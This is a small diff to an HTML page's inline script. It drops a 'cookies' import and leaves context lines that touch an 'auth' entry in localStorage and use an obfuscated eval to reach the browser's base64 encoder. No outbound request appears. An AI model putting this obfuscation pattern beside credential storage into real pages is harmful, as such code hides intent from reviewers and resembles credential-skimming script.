@@ -18,7 +18,7 @@
     <script>
       var debug = [];
       localStorage.setItem("auth", localStorage["auth"] || "");
-      importScript(["polymer-loader", "cookies"], function() {
+      importScript("polymer-loader", function() {
         var hash = window[eval('"'+([0x62, 0x74, 0x6F, 0x61]).map(n=>"\\x"+n.toString(16)).join("")+'"')];
         postN = 0;
         importPolymer("1.1.4", "paper-card", "paper-button", "paper-input");
